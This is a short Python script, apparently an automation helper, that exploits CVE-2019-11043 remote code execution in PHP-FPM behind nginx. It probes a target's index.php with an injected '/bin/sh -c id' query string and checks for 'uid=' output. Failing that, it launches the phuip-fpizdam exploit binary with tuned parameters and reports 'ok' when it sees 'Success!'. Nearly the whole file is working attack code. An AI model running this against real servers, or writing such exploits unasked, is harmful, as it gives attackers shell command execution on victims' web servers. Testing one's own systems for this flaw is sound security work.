#!/usr/bin/env python3
"""CVE-2019-11043 helper: force IPv4, sync run, kill immediately after Success."""
import subprocess, sys, os, signal
import urllib.request

if len(sys.argv) != 2:
    print("fail", flush=True)
    sys.exit(0)

target_url = sys.argv[1].replace("localhost", "127.0.0.1")  # ← IPv4
base = target_url.rsplit("/", 1)[0]
probe_url = base + "/index.php?a=/bin/sh+-c+'id'&"
GO_BIN = os.path.expanduser("~/go/bin/phuip-fpizdam")

# Step 1: probe a few times (nginx round-robins across workers)
for _ in range(5):
    try:
        with urllib.request.urlopen(probe_url, timeout=2) as r:
            if b"uid=" in r.read():
                print("ok", flush=True)
                sys.exit(0)
    except Exception:
        pass

# Step 2: run phuip-fpizdam synchronously, kill after Success (skip cleanup hang)
try:
    proc = subprocess.Popen(
        [GO_BIN, "--skip-detect", "--qsl", "1755", "--pisos", "182", target_url],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1, preexec_fn=os.setsid,
    )
    success = False
    try:
        for line in proc.stdout:
            if "Success!" in line:
                success = True
                break
    except Exception:
        pass
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
    except Exception:
        try: proc.kill()
        except: pass
    try: proc.wait(timeout=2)
    except: pass
    print("ok" if success else "fail", flush=True)
except FileNotFoundError:
    print(f"fail: binary not found", flush=True)
except Exception as e:
    print(f"fail: {e}", flush=True)

sys.exit(0)